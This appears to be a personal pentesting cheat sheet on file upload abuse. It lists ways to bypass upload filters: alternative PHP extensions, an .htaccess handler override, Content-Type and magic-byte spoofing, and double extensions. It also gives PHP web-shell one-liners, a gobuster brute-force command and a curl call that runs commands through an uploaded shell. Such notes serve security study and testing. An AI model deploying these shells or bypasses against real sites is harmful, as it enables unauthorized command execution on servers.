# File Upload Abuse
- Where the extension validation is doing **SEVER** or **CLIENT** (ctrl+u).
- You could use [PHP-alternative-extensions](https://book.hacktricks.xyz/pentesting-web/file-upload) to use php5, pht rather than php.
-  .htaccess file upload bypass -> *.bypass* files will be interpreted as .php.
	```txt
	AddType application/x-httpd-php .bypass
	```
	![[Pasted image 20230823161215.png]]
- Change variables like, **MAX_FILE_SIZE**.
- Replace `<?php system($_GET[0]);?>` by ``<?=`$_GET[0]`?>``.
- Replace **Content-Type** -> *application/x-php* by *image/jpg* or *image/gif*.
- Change *magic numbers* of the file [List-of-Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) -> insert `GIF8;` for gif file.
- Is the web making a encryption on the *file name* (even .php)? -> **md5**? **sha1**? (verify the number of characters of the hash) `locate \*sum`.
- Is the web making a encryption on the *file content*? -> **md5**? **sha1**? (verify the number of characters of the hash) `sha1sum <FILE>`.
- Web is storing the file in another **directory** -> *brute force*.
	```shell
	gobuster dir -u <URL> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
	```
- Use a **double extension attack** -> cmd.jpg.php.
- Use curl.
	```shell
	curl -s -X GET "<URL>" -G --data-urlencode "cmd=hostname -I"  
	```
	- `-G --data-urlencode`: GET and data urlencode.